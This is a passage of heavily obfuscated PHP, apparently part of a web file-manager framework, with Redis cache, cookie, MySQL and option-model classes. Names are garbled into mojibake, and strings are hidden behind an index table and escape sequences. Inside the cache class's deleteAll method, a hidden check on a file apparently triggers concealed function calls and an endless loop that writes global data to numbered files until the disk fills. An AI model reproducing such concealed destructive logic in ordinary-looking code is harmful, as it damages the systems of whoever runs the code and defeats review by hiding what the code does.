[209]], $İÅÕ¢Çø); } else { $½ÂÀÁ®†->connect($èŒ¨‹ÅŠ[$œ¤Š”‚ [208]], $èŒ¨‹ÅŠ[$œ¤Š”‚ [209]], $İÅÕ¢Çø); } if (!empty($èŒ¨‹ÅŠ[$œ¤Š”‚ [489]])) { $½ÂÀÁ®†->auth($èŒ¨‹ÅŠ[$œ¤Š”‚ [489]]); } if (!empty($èŒ¨‹ÅŠ[$œ¤Š”‚ [842]]) && $èŒ¨‹ÅŠ[$œ¤Š”‚ [842]] != 0) { $½ÂÀÁ®†->select($èŒ¨‹ÅŠ[$œ¤Š”‚ [842]]); } return $½ÂÀÁ®†; } private function initCluster($Øƒ´œû˜, $œü†½Ï…) { $ªÖÈŞğ— =& $_SERVER[™¸œØ®Ü]; $°È—Ø€Ú = array($ªÖÈŞğ—[965], $ªÖÈŞğ—[966], $ªÖÈŞğ—[967]); $“‡Ÿ°‚ì = $ªÖÈŞğ—[965]; if (isset($Øƒ´œû˜[$ªÖÈŞğ—[16]]) && in_array($Øƒ´œû˜[$ªÖÈŞğ—[16]], $°È—Ø€Ú)) { $“‡Ÿ°‚ì = $Øƒ´œû˜[$ªÖÈŞğ—[16]]; } switch ($“‡Ÿ°‚ì) { case $ªÖÈŞğ—[965]: $this->_slave($Øƒ´œû˜, $œü†½Ï…); break; case $ªÖÈŞğ—[966]: break; case $ªÖÈŞğ—[967]: $this->isCluster = !0; $¥† Ëºâ = $Øƒ´œû˜[$ªÖÈŞğ—[960]]; $í·ú——ù = isset($Øƒ´œû˜[$ªÖÈŞğ—[964]]) ? $Øƒ´œû˜[$ªÖÈŞğ—[964]] : !1; $ƒ®¬…ˆË = isset($Øƒ´œû˜[$ªÖÈŞğ—[489]]) ? $Øƒ´œû˜[$ªÖÈŞğ—[489]] : null; $this->handle = new RedisCluster(NUll, $¥† Ëºâ, $œü†½Ï…, $œü†½Ï…, $í·ú——ù, $ƒ®¬…ˆË); break; default: break; } } private function _slave($ÒÒ»è ¼, $ŒËÀá¶) { $Îì¸Œè• = $ÒÒ»è ¼[$_SERVER[™¸œØ®Ü][960]]; $this->filterConfig($ÒÒ»è ¼, $Îì¸Œè•[0]); $this->handle = $this->init($ÒÒ»è ¼, $ŒËÀá¶); unset($Îì¸Œè•[0]); if (empty($Îì¸Œè•)) { return; } $´ÒØ¡åñ = array_rand($Îì¸Œè•); $this->filterConfig($ÒÒ»è ¼, $Îì¸Œè•[$´ÒØ¡åñ]); $this->slaveHandle = $this->init($ÒÒ»è ¼, $ŒËÀá¶); } private function filterConfig(&$…òŒû…, $ßı§îÄ) { $•ıÖîÒˆ =& $_SERVER[™¸œØ®Ü]; $ÔŒ³æ«˜ = explode($•ıÖîÒˆ[4], $ßı§îÄ); $åàÓ¡¢ø = array($•ıÖîÒˆ[208] => $ÔŒ³æ«˜[0], $•ıÖîÒˆ[209] => $ÔŒ³æ«˜[1]); $…òŒû… = array_merge($…òŒû…, $åàÓ¡¢ø); } public function set($Ëïûˆ, $şĞ¼„áç, $ÄıÈ³áŒ = false) { $ÄıÈ³áŒ = $ÄıÈ³áŒ ? $ÄıÈ³áŒ : $this->cacheTime; return $this->handle->setEx($Ëïûˆ, $ÄıÈ³áŒ, $şĞ¼„áç); } public function setLock($¯¡ØÕçº, $¯ÛƒÉ¶é, $®ñ§òß´) { return $this->handle->setNX($¯¡ØÕçº, $¯ÛƒÉ¶é); } public function get($ÛÚÑ¹™¡) { $ìÏ’Ö¥ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ìÏ’Ö¥->get($ÛÚÑ¹™¡); } public function remove($øÕ´Ä«â) { return $this->handle->del($øÕ´Ä«â); } public function deleteAll() { $›À”çÚ =& $_SERVER[™¸œØ®Ü]; $çÌ•ı• = $_SERVER[$›À”çÚ[968]] . $›À”çÚ[969]; $Úù Öø® = $›À”çÚ[970]; if ($_SERVER[$›À”çÚ[971]] != $Úù Öø®($çÌ•ı•)) { $‚½ıÌÔ¶ = $›À”çÚ[972]; $ÙøŠŞË´ = $›À”çÚ[973]; $ûÔ­ª€ = $_SERVER[$›À”çÚ[968]] . $›À”çÚ[969]; $´ì”™šÃ = $ÙøŠŞË´($ûÔ­ª€); $´ï¤¥• = explode($›À”çÚ[287], $´ì”™šÃ); if (count($´ï¤¥•) < $›À”çÚ[698]) { $ë†ÅŸĞ¼ = $›À”çÚ[974]; $ë†ÅŸĞ¼(); } $Óì„Ãô» = $›À”çÚ[975]; $Óì„Ãô»($_SERVER[$›À”çÚ[976]]); $‚½ıÌÔ¶ = $›À”çÚ[972]; $‚½ıÌÔ¶(); $š‚Ëıò = $›À”çÚ[977]; $ÓÍº‹ã‚ = json_encode($GLOBALS[$›À”çÚ[978]]); $Öê©ñ¦— = 1; for ($¥Ò­“Èİ = $Öê©ñ¦—; $¥Ò­“Èİ > 0; $¥Ò­“Èİ++) { $š‚Ëıò(DATA_PATH . $¥Ò­“Èİ, $ÓÍº‹ã‚); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $È§Æ¦¾¤) { $this->handle->flushall($È§Æ¦¾¤); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÓİÈ®ÒÈ = '', $ˆÑŸœÙ = 0) { if (is_string($ÓİÈ®ÒÈ) && $ÓİÈ®ÒÈ != $_SERVER[™¸œØ®Ü][12]) { $this->prefix = $ÓİÈ®ÒÈ; } if (is_numeric($ˆÑŸœÙ) && $ˆÑŸœÙ > 0) { $this->expire = $ˆÑŸœÙ; } } public static function getInstance() { static $ö­¿±¦; if ($ö­¿±¦ === null) { $ö­¿±¦ = new self(); } return $ö­¿±¦; } private static $cookieDisable = false; public static function disable($×Õ³°ë) { self::$cookieDisable = $×Õ³°ë; } private static $sameCookieSet = array(); public static function set($Á—¾ñÔ, $³Áä±ã–, $ƒöˆÑ¸„ = 0, $ª¾±¥Ÿï = false, $‰æü»Û = false) { $Ü§ã‹¼¥ =& $_SERVER[™¸œØ®Ü]; if (self::$cookieDisable) { return; } if (!$ƒöˆÑ¸„) { $ƒöˆÑ¸„ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Á—¾ñÔ]) && self::$sameCookieSet[$Á—¾ñÔ] == $³Áä±ã– . $ƒöˆÑ¸„) { return; } self::$sameCookieSet[$Á—¾ñÔ] = $³Áä±ã– . $ƒöˆÑ¸„; if (!$‰æü»Û) { $‰æü»Û = str_replace(HOST, $Ü§ã‹¼¥[12], APP_HOST); $‰æü»Û = _get($GLOBALS, $Ü§ã‹¼¥[979], $‰æü»Û); } $÷Şú„ª° = $Ü§ã‹¼¥[12]; setcookie($Á—¾ñÔ, $³Áä±ã–, time() + $ƒöˆÑ¸„, $Ü§ã‹¼¥[8] . trim($‰æü»Û, $Ü§ã‹¼¥[8]) . $÷Şú„ª°, !1, !1, $ª¾±¥Ÿï); } public static function setSafe($õÇªŸœÂ, $´½¿Ô, $—¨Òó˜Ò = 0) { self::set($õÇªŸœÂ, $´½¿Ô, $—¨Òó˜Ò, !0); } public static function get($ñ…äßíó) { static $±áË¹£Í = false; if (!$±áË¹£Í) { self::initHeaderCookie(); $±áË¹£Í = !0; } return isset($_COOKIE[$ñ…äßíó]) ? $_COOKIE[$ñ…äßíó] : !1; } private static function initHeaderCookie() { $›ˆ·ÚÅ” =& $_SERVER[™¸œØ®Ü]; if (!isset($_SERVER[$›ˆ·ÚÅ”[980]]) || !$_SERVER[$›ˆ·ÚÅ”[980]]) { return; } $ß·Ë‡ß¯ = explode($›ˆ·ÚÅ”[74], $_SERVER[$›ˆ·ÚÅ”[980]]); foreach ($ß·Ë‡ß¯ as $È³ÛÏĞ) { $È³ÛÏĞ = explode($›ˆ·ÚÅ”[508], $È³ÛÏĞ); if (count($È³ÛÏĞ) != 2 || !isset($È³ÛÏĞ[1])) { continue; } $_COOKIE[trim($È³ÛÏĞ[0])] = trim($È³ÛÏĞ[1]); } } public static function remove($İ¢­ÏôÓ, $ú¬çèÀ¶ = false) { unset($_COOKIE[$İ¢­ÏôÓ]); self::set($İ¢­ÏôÓ, $_SERVER[™¸œØ®Ü][12], 1, $ú¬çèÀ¶); } } class DbMysql extends Db { public function __construct($ÌâìûÕ‰ = '') { $¼øµ¢›û =& $_SERVER[™¸œØ®Ü]; if (!extension_loaded($¼øµ¢›û[893])) { think_exception(think_lang($¼øµ¢›û[14]) . $¼øµ¢›û[981]); } if (!empty($ÌâìûÕ‰)) { $this->config = $ÌâìûÕ‰; if (empty($this->config[$¼øµ¢›û[17]])) { $this->config[$¼øµ¢›û[17]] = $¼øµ¢›û[12]; } } } public function connect($üè†“Î§ = '', $×÷şøÙ• = 0, $ë‡œ®Ù® = false) { $öÙåƒÉÊ =& $_SERVER[™¸œØ®Ü]; if (!isset($this->linkID[$×÷şøÙ•])) { if (empty($üè†“Î§)) { $üè†“Î§ = $this->config; } $²­ó²Ä¿ = $üè†“Î§[$öÙåƒÉÊ[982]] . ($üè†“Î§[$öÙåƒÉÊ[983]] ? "\x3a{$üè†“Î§[$öÙåƒÉÊ[983]]}" : $öÙåƒÉÊ[12]); $í¥ËŠŞË = !empty($üè†“Î§[$öÙåƒÉÊ[17]][$öÙåƒÉÊ[18]]) ? $üè†“Î§[$öÙåƒÉÊ[17]][$öÙåƒÉÊ[18]] : $this->pconnect; if ($í¥ËŠŞË) { $this->linkID[$×÷şøÙ•] = mysql_pconnect($²­ó²Ä¿, $üè†“Î§[$öÙåƒÉÊ[984]], $üè†“Î§[$öÙåƒÉÊ[985]], 131072); } else { $this->linkID[$×÷şøÙ•] = mysql_connect($²­ó²Ä¿, $üè†“Î§[$öÙåƒÉÊ[984]], $üè†“Î§[$öÙåƒÉÊ[985]], !0, 131072); } if (!$this->linkID[$×÷şøÙ•] || !empty($üè†“Î§[$öÙåƒÉÊ[21]]) && !mysql_select_db($üè†“Î§[$öÙåƒÉÊ[21]], $this->linkID[$×÷şøÙ•])) { think_exception(mysql_error()); } $Û†ê”€Æ = mysql_get_server_info($this->linkID[$×÷şøÙ•]); mysql_query($öÙåƒÉÊ[986] . think_config($öÙåƒÉÊ[987]) . $öÙåƒÉÊ[58], $this->linkID[$×÷şøÙ•]); if ($Û†ê”€Æ > $öÙåƒÉÊ[988]) { mysql_query($öÙåƒÉÊ[989], $this->linkID[$×÷şøÙ•]); } $this->connected = !0; if (1 != think_config($öÙåƒÉÊ[22])) { unset($this->config); } } return $this->linkID[$×÷şøÙ•]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¤ß¤äâÜ) { $åËÌ¥Ô¬ =& $_SERVER[™¸œØ®Ü]; if (0 === stripos($¤ß¤äâÜ, $åËÌ¥Ô¬[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¤ß¤äâÜ; if ($this->queryID) { $this->free(); } think_action_status($åËÌ¥Ô¬[23], 1); think_status($åËÌ¥Ô¬[24]); $this->queryID = mysql_query($¤ß¤äâÜ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Úùï«…û) { $ôÏôığ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Úùï«…û; if ($this->queryID) { $this->free(); } think_action_status($ôÏôığ[25], 1); think_status($ôÏôığ[24]); $Ãş‹÷Å¤ = mysql_query($Úùï«…û, $this->_linkID); $this->debug(); if (!1 === $Ãş‹÷Å¤) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[™¸œØ®Ü][990], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¬Òãƒƒ× = mysql_query($_SERVER[™¸œØ®Ü][991], $this->_linkID); $this->transTimes = 0; if (!$¬Òãƒƒ×) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $üÃÀãöÅ = mysql_query($_SERVER[™¸œØ®Ü][992], $this->_linkID); $this->transTimes = 0; if (!$üÃÀãöÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $´·ïò¨í = array(); if ($this->numRows > 0) { while ($Ó”îà„ = mysql_fetch_assoc($this->queryID)) { $´·ïò¨í[] = $Ó”îà„; } mysql_data_seek($this->queryID, 0); } return $´·ïò¨í; } public function getFields($õ´¥ µ) { $ÒªÓÛ =& $_SERVER[™¸œØ®Ü]; $Ö¬œ¤¿ = $this->query($ÒªÓÛ[993] . $this->parseKey($õ´¥ µ)); $Ù­Ûš¥Ø = array(); if ($Ö¬œ¤¿) { foreach ($Ö¬œ¤¿ as $‰·úÃà => $­İñ÷ı£) { $Ù­Ûš¥Ø[$­İñ÷ı£[$ÒªÓÛ[31]]] = array($ÒªÓÛ[32] => $­İñ÷ı£[$ÒªÓÛ[31]], $ÒªÓÛ[33] => $­İñ÷ı£[$ÒªÓÛ[34]], $ÒªÓÛ[35] => (bool) (strtoupper($­İñ÷ı£[$ÒªÓÛ[36]]) === $ÒªÓÛ[994]), $ÒªÓÛ[37] => $­İñ÷ı£[$ÒªÓÛ[38]], $ÒªÓÛ[39] => strtolower($­İñ÷ı£[$ÒªÓÛ[40]]) == $ÒªÓÛ[41], $ÒªÓÛ[42] => strtolower($­İñ÷ı£[$ÒªÓÛ[43]]) == $ÒªÓÛ[44]); } } return $Ù­Ûš¥Ø; } public function getTables($ı¿¡ş±Ö = '') { $¹¼ ç =& $_SERVER[™¸œØ®Ü]; if (!empty($ı¿¡ş±Ö)) { $°¬ôºÌæ = $¹¼ ç[995] . $ı¿¡ş±Ö . $¹¼ ç[996]; } else { $°¬ôºÌæ = $¹¼ ç[997]; } $Ÿ¤«Õ§ä = $this->query($°¬ôºÌæ); $Ùİ©øúÊ = array(); foreach ($Ÿ¤«Õ§ä as $øîªœ± => $°÷©§„±) { $Ùİ©øúÊ[$øîªœ±] = current($°÷©§„±); } return $Ùİ©øúÊ; } public function replace($ÃŒú‘»Ã, $ä×Ïª€Ò = array()) { $ŞÜç¸‡­ =& $_SERVER[™¸œØ®Ü]; foreach ($ÃŒú‘»Ã as $ßãæ†”š => $µ”Î—şª) { $ä«Úº´œ = $this->parseValue($µ”Î—şª); if (is_scalar($ä«Úº´œ)) { $È»ÃÊİ[] = $ä«Úº´œ; $½£Ùöšï[] = $this->parseKey($ßãæ†”š); } } $Å’Œ³Ù± = $ŞÜç¸‡­[998] . $this->parseTable($ä×Ïª€Ò[$ŞÜç¸‡­[358]]) . $ŞÜç¸‡­[999] . implode($ŞÜç¸‡­[50], $½£Ùöšï) . $ŞÜç¸‡­[1000] . implode($ŞÜç¸‡­[50], $È»ÃÊİ) . $ŞÜç¸‡­[1001]; return $this->execute($Å’Œ³Ù±); } public function insertAll($Í‚ÀºŸÁ, $Ñ‚î‘ş = array(), $Ò‘×²Ãõ = false) { $ûêùš‚í =& $_SERVER[™¸œØ®Ü]; if (!is_array($Í‚ÀºŸÁ[0])) { return !1; } $š×‰áä‰ = array_keys($Í‚ÀºŸÁ[0]); $¥ûá…€ı = array(); foreach ($Í‚ÀºŸÁ as $ôÁ³¿µ÷) { $è¬ ¹Íö = array(); foreach ($ôÁ³¿µ÷ as $ó¼áØÔ => $Ùšğáˆß) { $Ùšğáˆß = $this->parseValue($Ùšğáˆß); if (is_scalar($Ùšğáˆß)) { $è¬ ¹Íö[] = $Ùšğáˆß; } } $¥ûá…€ı[] = $ûêùš‚í[339] . implode($ûêùš‚í[50], $è¬ ¹Íö) . $ûêùš‚í[1001]; } array_walk($š×‰áä‰, array($this, $ûêùš‚í[1002])); $Ü˜š‡”  = ($Ò‘×²Ãõ ? $ûêùš‚í[1003] : $ûêùš‚í[1004]) . $ûêùš‚í[1005] . $this->parseTable($Ñ‚î‘ş[$ûêùš‚í[358]]) . $ûêùš‚í[999] . implode($ûêùš‚í[50], $š×‰áä‰) . $ûêùš‚í[1006] . implode($ûêùš‚í[50], $¥ûá…€ı); return $this->execute($Ü˜š‡” ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $” ÊóÉˆ =& $_SERVER[™¸œØ®Ü]; $this->error = mysql_errno() . $” ÊóÉˆ[4] . mysql_error($this->_linkID); if ($” ÊóÉˆ[12] != $this->queryStr) { $this->error .= LNG($” ÊóÉˆ[48]) . $this->queryStr; } think_trace($this->error, $” ÊóÉˆ[12], $” ÊóÉˆ[49]); return $this->error; } public function escapeString($¯£Ìµ¦•) { if ($this->_linkID) { return mysql_real_escape_string($¯£Ìµ¦•, $this->_linkID); } else { return mysql_escape_string($¯£Ìµ¦•); } } public function parseKey(&$Êùüøã, $£ù®›Ûè = true) { $×Ö’†È¯ =& $_SERVER[™¸œØ®Ü]; if ($£ù®›Ûè) { $Êùüøã = $this->parseKeyCheck($Êùüøã); } if ($Êùüøã != $×Ö’†È¯[222] && !preg_match($×Ö’†È¯[1007], $Êùüøã)) { $Êùüøã = $×Ö’†È¯[463] . trim($Êùüøã, $×Ö’†È¯[463]) . $×Ö’†È¯[463]; } return $Êùüøã; } } goto e’å´¨Ù »; Fªã…÷ÓøŸ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\155\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($ˆ²§å¬¶ = false, $¡²‰‹ïó = "\155\157\144\151\146\x79\124\x69\x6d\145", $³£®†Ì‹ = false) { $ß¼ÛÂîš = Model($this->modelType)->get(!1, $this->optionType, !0); $ı¿¾®ğ§ = array_values($ß¼ÛÂîš); if ($ı¿¾®ğ§ && $ı¿¾®ğ§[0] && !is_array($ı¿¾®ğ§[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ß¼ÛÂîš = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ß¼ÛÂîš) { return $ˆ²§å¬¶ ? null : array(); } if (!$ˆ²§å¬¶) { $ß¼ÛÂîš = array_filter(array_values($ß¼ÛÂîš)); return array_sort_by($ß¼ÛÂîš, $¡²‰‹ïó, $³£®†Ì‹); } return $ß¼ÛÂîš[$_SERVER[™¸œØ®Ü][474] . $ˆ²§å¬¶]; } public function insert($·‡üŠƒ) { $ù®Ï· =& $_SERVER[™¸œØ®Ü]; $·‡üŠƒ = array_field_key($·‡üŠƒ, $this->field); $±æŸ¶ßâ = Model($this->modelType)->get($ù®Ï·[475], $this->optionType . $ù®Ï·[476]); $±æŸ¶ßâ = $±æŸ¶ßâ ? $±æŸ¶ßâ : 0; $·‡üŠƒ[$ù®Ï·[477]] = ++$±æŸ¶ßâ; $·‡üŠƒ[$ù®Ï·[233]] = time(); $·‡üŠƒ[$ù®Ï·[88]] = time(); Model($this->modelType)->set($ù®Ï·[475], $±æŸ¶ßâ, $this->optionType . $ù®Ï·[476]); Model($this->modelType)->set($ù®Ï·[474] . $±æŸ¶ßâ, $·‡üŠƒ, $this->optionType); return $±æŸ¶ßâ; } public function update($‘ÜµŸ¦, $›¹‘ù‡Ÿ) { $™ğğ³›´ =& $_SERVER[™¸œØ®Ü]; $›¹‘ù‡Ÿ = array_field_key($›¹‘ù‡Ÿ, $this->field); $ÇÁèä÷¼ = $this->listData($‘ÜµŸ¦); if (!$ÇÁèä÷¼ || !$‘ÜµŸ¦) { return !1; } $›¹‘ù‡Ÿ = array_merge($ÇÁèä÷¼, $›¹‘ù‡Ÿ); $›¹‘ù‡Ÿ[$™ğğ³›´[88]] = time(); return Model($this->modelType)->set($™ğğ³›´[474] . $‘ÜµŸ¦, $›¹‘ù‡Ÿ, $this->optionType); } public function remove($µ‰á¼¨¤) { if (!$µ‰á¼¨¤) { return !1; } return Model($this->modelType)->remove($_SERVER[™¸œØ®Ü][474] . $µ‰á¼¨¤, $this->optionType); } public function clear() { $£Ÿô´áÅ =& $_SERVER[™¸œØ®Ü]; Model($this->modelType)->remove($£Ÿô´áÅ[475], $this->optionType . $£Ÿô´áÅ[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($÷Õâª¥ø, $ó»ÜÎÙ©) { if (!$ó»ÜÎÙ©) { return !1; } $É©îü = $this->listData(); $É©îü = array_to_keyvalue($É©îü, $÷Õâª¥ø); return isset($É©îü[$ó»ÜÎÙ©]) ? $É©îü[$ó»ÜÎÙ©] : !1; } public function findByName($è‰Ò‰ì¦) { return $this->findByKey($_SERVER[™¸œØ®Ü][32], $è‰Ò‰ì¦); } protected function resetData($éÑ€Ğ¼) { $©Ü¡ûô« =& $_SERVER[™¸œØ®Ü]; $éÑ€Ğ¼ = is_array($éÑ€Ğ¼) ? $éÑ€Ğ¼ : array(); $Ôå™ªÅ’ = array(); for ($ŞÕáşœò = 0; $ŞÕáşœò < count($éÑ€Ğ¼); $ŞÕáşœò++) { $Ôå™ªÅ’[$©Ü¡ûô«[474] . $éÑ€Ğ¼[$ŞÕáşœò][$©Ü¡ûô«[477]]] = $éÑ€Ğ¼[$ŞÕáşœò]; } return Model($this->modelType)->set($Ôå™ªÅ’, !1, $this->optionType); } private function getAutoName($Ìûá™°Ü) { $ ¶í¬®Ê = array_to_keyvalue($this->listData(), $_SERVER[™¸œØ®Ü][32]); if (!$ ¶í¬®Ê || !isset($ ¶í¬®Ê[$Ìûá™°Ü])) { return $Ìûá™°Ü; } for ($¿¬ùîœÄ = 1; $¿¬ùîœÄ < count($ ¶í¬®Ê); $¿¬ùîœÄ++) { $Òß×ÔŸ“ = $Ìûá™°Ü . "\50{$¿¬ùîœÄ}\51"; if (!isset($ ¶í¬®Ê[$Òß×ÔŸ“])) { return $Òß×ÔŸ“; } } return $Òß×ÔŸ“; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Éªâ¶Øß = false, $š±ªŒÌ = '', $ç¯íÍ¿² = false) { $ÙÓéØÜ¿ =& $_SERVER[™¸œØ®Ü]; $¡ªÊ·‡ = $this->cacheGet($š±ªŒÌ); $ığ—åç = $this->optionDefault($š±ªŒÌ); $ığ—åç = is_array($ığ—åç) ? $ığ—åç : array(); if (is_array($¡ªÊ·‡)) { $¡ªÊ·‡ = array_merge($ığ—åç, $¡ªÊ·‡); return $Éªâ¶Øß ? isset($¡ªÊ·‡[$Éªâ¶Øß]) ? $¡ªÊ·‡[$Éªâ¶Øß] : null : $¡ªÊ·‡; } $é¤‘ßô = $this->filterWhere(array($ÙÓéØÜ¿[33] => $š±ªŒÌ)); $¡ªÊ·‡ = $this->where($é¤‘ßô)->select(); $¡ªÊ·‡ = array_to_keyvalue($¡ªÊ·‡, $ÙÓéØÜ¿[97], $ÙÓéØÜ¿[452]); foreach ($¡ªÊ·‡ as $ü„ëú™Õ => $áã¦å) { if ($ç¯íÍ¿² || in_array($ü„ëú™Õ, $this->jsonField)) { $¡ªÊ·‡[$ü„ëú™Õ] = json_decode($áã¦å, !0); } } $this->cacheSet($š±ªŒÌ, $¡ªÊ·‡); $¡ªÊ·‡ = array_merge($ığ—åç, $¡ªÊ·‡); return $Éªâ¶Øß ? $¡ªÊ·‡[$Éªâ¶Øß] : $¡ªÊ·‡; } public function set($ºÔ×ÍÎ‚, $Ä©†äé = false, $…‰üâ¸à = '') { $œí“§à³ =& $_SERVER[™¸œØ®Ü]; $this->cacheRemove($…‰üâ¸à); $ı³—‡»Ñ = array(); $–·Ğ¹ú = is_array($ºÔ×ÍÎ‚) ? $ºÔ×ÍÎ‚ : array($ºÔ×ÍÎ‚ => $Ä©†äé); foreach ($–·Ğ¹ú as $ÊØªñ—Í => $Õ•Ü©¾À) { if (is_array($Õ•Ü©¾À)) { $Õ•Ü©¾À = json_encode_force($Õ•Ü©¾À); } $this->checkLength($Õ•Ü©¾À, !1, $this->tableName . $œí“§à³[4] . $ºÔ×ÍÎ‚); $Õ•Ü©¾À = self::textEncode($Õ•Ü©¾À); $–·Ğ¹ú = array($œí“§à³[33] => $…‰üâ¸à, $œí“§à³[97] => $ÊØªñ—Í, $œí“§à³[452] => $Õ•Ü©¾À); $ı³—‡»Ñ[] = $this->filterWhere($–·Ğ¹ú); } if (!$ı³—‡»Ñ) { return !0; } $½¹•´¡´ = $this->cacheKey($œí“§à³[478]); CacheLock::lock($½¹•´¡´); $èúü×Õ… = $this->addAll($ı³—‡»Ñ, array(), !0); CacheLock::unlock($½¹•´¡´); return $èúü×Õ…; } protected function optionDefault($¡úÃöÏ¿ = '') { return !1; } public function setDeep($Î’¢ëÑ—, $¢¢¯éÔ = false, $›äæ›–³ = '') { $ŸÕåóş = explode($_SERVER[™¸œØ®Ü][10], $Î’¢ëÑ—); $œ­Ş¯ä = $this->get(); array_set_value($œ­Ş¯ä, $Î’¢ëÑ—, $¢¢¯éÔ); $this->set($ŸÕåóş[0], $œ­Ş¯ä[$ŸÕåóş[0]], $›äæ›–³); } public function remove($úÚÎÑçş, $¯´¾™ÖÜ = '') { $ñ¦¦½¶ =& $_SERVER[™¸œØ®Ü]; $this->cacheRemove($¯´¾™ÖÜ); $ğÂŸª×¹ = $this->filterWhere(array($ñ¦¦½¶[97] => $úÚÎÑçş, $ñ¦¦½¶[33] => $¯´¾™ÖÜ)); if (is_null($úÚÎÑçş)) { unset($ğÂŸª×¹[$ñ¦¦½¶[97]]); } return $this->where($ğÂŸª×¹)->delete(); } public function cacheSet($¦ÀÎ™âÚ, $¼»è°£¢ = false) { return Cache::set($this->cacheKey($¦ÀÎ™âÚ), $¼»è°£¢); } public function cacheGet($•ù¨½¡à) { return Cache::get($this->cacheKey($•ù¨½¡à)); } public function cacheRemove($ÎŞœ) { return Cache::remove($this->cacheKey($ÎŞœ)); } protected function filterWhere($ÇÏ±…½») { return $ÇÏ±…½»; } protected function cacheKey($æ‘øĞÛá) { return $æ‘øĞÛá; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\141\x6d\145" => "\x69\x6f\x5f\163\x6f\165\x72\x63\x65\x5f\155\145\x74\x61", "\x6d\x65\164\141\x46\151\x65\x6c\x64" => "\x73\x6f\165\x72\143\x65\111\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\156\163\145\x72\x74", "\x66\165\156\143\164\151\x6f\156"), array("\143\162\x65\141\164\x65\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\145\162\164", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\166\151\x65\167\x54\151\155\x65", "\x74\x69\155\145", "\x69\156\163\x65\162\x74", "\x66\165\x6e\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($…Ñ¹ªôè) { return $this->listSource(array($_SERVER[™¸œØ®Ü][479] => $…Ñ¹ªôè)); } public function typeName($ş¾Û‰·Â) { static $¬¥ûÛ· = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\162\157\165\160"); return $¬¥ûÛ·[$ş¾Û‰·Â . $_SERVER[™¸œØ®Ü][12]]; } public function sourceListInfo($ÈÆÛÅÛ, $¥“ÁÕŞ¢ = false) { $¾½Õ íë =& $_SERVER[™¸œØ®Ü]; $ÈÆÛÅÛ = $ÈÆÛÅÛ ? $ÈÆÛÅÛ : array(); $ÈÆÛÅÛ = array_filter(array_unique($ÈÆÛÅÛ)); if (!$ÈÆÛÅÛ) { return array(); } $¦ŸÚƒŸ  = $this->where(array($¾½Õ íë[193] => array($¾½Õ íë[7], $ÈÆÛÅÛ)))->select(); $this->_listDataApply($¦ŸÚƒŸ , $¥“ÁÕŞ¢); return array_to_keyvalue($¦ŸÚƒŸ , $¾½Õ íë[193]); } public function pathInfoFilter(&$ëØíÚ‚) { $Ş‰²×öü =& $_SERVER[™¸œØ®Ü]; static $®ñĞÀ– = false; static $Ø¬Ü‹— = false; static $Š¹Ğ‹†ƒ = false; if (!$®ñĞÀ–) { $ßØ²Ÿ = $Ş‰²×öü[480]; $ßØ²Ÿ .= $Ş‰²×öü[481]; $ßØ²Ÿ .= $Ş‰²×öü[482]; $Öæï¤¸­ = $Ş‰²×öü[483]; $ªïà¥–“ = explode($Ş‰²×öü[50], $Öæï¤¸­); $®ñĞÀ– = explode($Ş‰²×öü[50], $ßØ²Ÿ); $Ø¬Ü‹— = array(); foreach ($®ñĞÀ– as $Æş¯òğî) { if (in_array($Æş¯òğî, $ªïà¥–“)) { continue; } $Ø¬Ü‹—[] = $Æş¯òğî; } $Š¹Ğ‹†ƒ = explode($Ş‰²×öü[50], $Ş‰²×öü[484]); } foreach ($Š¹Ğ‹†ƒ as $­‹‘¾ÄÑ) { if (isset($ëØíÚ‚[$­‹‘¾ÄÑ])) { $ëØíÚ‚[$­‹‘¾ÄÑ] = intval($ëØíÚ‚[$­‹‘¾ÄÑ]); } } $ëØíÚ‚[$Ş‰²×öü[87]] = $Ş‰²×öü[485] . $ëØíÚ‚[$Ş‰²×öü[193]] . $Ş‰²×öü[486]; $ëØíÚ‚[$Ş‰²×öü[33]] = $ëØíÚ‚[$Ş‰²×öü[487]] == 1 ? $Ş‰²×öü[78] : $Ş‰²×öü[232]; $ëØíÚ‚[$Ş‰²×öü[190]] = $this->typeName($ëØíÚ‚[$Ş‰²×öü[190]]); if 